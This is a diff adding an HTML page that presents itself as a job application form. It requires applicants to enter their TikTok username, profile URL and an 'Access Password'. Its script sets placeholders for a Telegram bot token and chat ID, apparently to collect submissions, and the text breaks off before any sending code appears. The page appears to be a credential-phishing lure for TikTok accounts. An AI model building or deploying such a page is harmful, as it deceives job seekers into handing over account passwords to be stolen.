@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Advanced Job Application</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+</head>
+<body>
+
+  <div class="form-container">
+    <h2>🚀 Advanced Job Application</h2>
+    <form id="jobForm">
+      <div class="form-grid">
+        <div class="form-group">
+          <span class="icon">👤</span>
+          <input type="text" id="name" required placeholder=" " />
+          <label for="name">Full Name</label>
+        </div>
+
+        <div class="form-group">
+          <span class="icon">📧</span>
+          <input type="email" id="email" required placeholder=" " />
+          <label for="email">Email Address</label>
+        </div>
+
+        <div class="form-group">
+          <span class="icon">📱</span>
+          <input type="text" id="phone" placeholder=" " />
+          <label for="phone">Phone Number</label>
+        </div>
+
+        <div class="form-group">
+          <span class="icon">🎵</span>
+          <input type="text" id="tiktokId" required placeholder=" " />
+          <label for="tiktokId">TikTok Username</label>
+        </div>
+
+        <div class="form-group">
+          <span class="icon">🔗</span>
+          <input type="url" id="tiktokUrl" required placeholder=" " />
+          <label for="tiktokUrl">TikTok Profile URL</label>
+        </div>
+
+        <div class="form-group">
+          <span class="icon">🔒</span>
+          <input type="password" id="password" required placeholder=" " />
+          <label for="password">Access Password</label>
+        </div>
+
+        <div class="form-group" style="grid-column: 1 / -1;">
+          <span class="icon">📝</span>
+          <textarea id="message" placeholder=" "></textarea>
+          <label for="message">Why Should We Hire You?</label>
+        </div>
+
+        <div class="form-group" style="grid-column: 1 / -1;">
+          <div class="drop-area" id="dropArea">📎 Drag & Drop Resume Here or Click to Upload</div>
+          <input type="file" id="resume" style="display: none;" />
+        </div>
+      </div>
+
+      <button type="submit">Submit Application</button>
+      <div id="successMsg" class="status-message success"></div>
+      <div id="errorMsg" class="status-message error"></div>
+    </form>
+  </div>
+
+  <div id="toast" class="toast">✅ Application submitted successfully!</div>
+
+  <script>
+    const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    const form = document.getElementById('jobForm');
+    const resumeInput = document.getElementById('resume');
+    const dropArea = document.getElementById('dropArea');
+
+    // Dropzone
+    dropArea.addEventListener('click', () => resumeInput.click());
+    dropArea.addEventListener('dragover', e => {
+      e.preventDefault();
+      dropArea.classList.add('dragover');
+    });
+    dropArea.addEventListener('dragleave', () => dropArea.classList.remove('dragover'));
+    dropArea.addEventListener('drop', e => {
+      e.preventDefault();
+      dropArea.classList.remove('dragover');
+      const file = e.dataTransfer.files[0];
+      resumeInput.files = e.dataTransfer.files;
+      dropArea.textContent = `📄 ${file.name}`;
+    });
+    resumeInput.addEventListener('change', () => {
+      const file = resumeInput.files[0];
+      if (file) {
+        dropArea.textContent = `📄 ${file.name}`;
+      }
+    });
+
+    function showToast(message) {
+      const toast = document.getElementById('toast');
+      toast.tex
